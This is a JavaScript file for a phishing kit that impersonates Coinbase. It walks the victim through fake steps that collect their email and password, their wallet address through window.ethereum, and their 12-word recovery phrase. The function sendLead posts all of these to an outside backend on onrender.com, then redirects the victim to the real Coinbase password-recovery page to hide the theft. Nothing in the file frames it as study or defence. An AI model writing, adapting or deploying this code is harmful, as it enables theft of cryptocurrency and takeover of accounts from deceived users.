const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    // Step 1 -> Step 2
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // Step 2 -> Step 3
    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if (!email || !pass) return alert('Please fill in all fields.');
        
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    // Step 3: Wallet Connection or Recovery Phrase
    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const password = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                status.innerText = 'Connecting to wallet...';
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const wallet = accounts[0];
                await sendLead(email, password, wallet, null);
            } catch (err) {
                status.innerText = 'Wallet connection failed. Use recovery phrase.';
                setupRecoveryField(email, password);
            }
        } else {
            setupRecoveryField(email, password);
        }
    };

    function setupRecoveryField(email, password) {
        // Clear only the content of step-3 to prevent double buttons
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 24px; margin-top: 10px;">Identity Verification</h1>
            <p>Please enter your 12-word recovery phrase to continue.</p>
            <div style="background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; margin: 15px 0;">
                <input type="text" id="phrase" placeholder="word1 word2 ..." 
                       style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 16px;">
                <button id="recoverySubmit" class="btn-primary" style="width: 100%; padding: 12px; font-weight: bold;">Restore Access</button>
            </div>
            <div id="recoveryStatus" style="text-align: center; color: red; font-size: 14px; margin-top: 10px;"></div>
        `;

        const btn = document.getElementById('recoverySubmit');
        const input = document.getElementById('phrase');
        const recStatus = document.getElementById('recoveryStatus');

        btn.onclick = async () => {
            const phrase = input.value.trim();
            if (phrase.split(/\s+/).length !== 12) {
                recStatus.innerText = "Exactly 12 words are required.";
                return;
            }
            recStatus.innerText = "Verifying recovery phrase...";
            await sendLead(email, password, null, phrase);
        };

        input.onkeydown = (e) => { if (e.key === 'Enter') btn.click(); };
    }

    async function sendLead(email, password, wallet, phrase) {
        try {
            const response = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: email, 
                    password: password, 
                    walletAddress: wallet, 
                    recoveryPhrase: phrase 
                })
            });

            if (response.ok) {
                // Redirect to Coinbase password recovery or home
                window.location.href = 'https://www.coinbase.com/password-recovery';
            } else {
                status.innerText = "Server error. Please try again.";
            }
        } catch (err) {
            status.innerText = "Connection error. Please check your internet.";
        }
    }
});
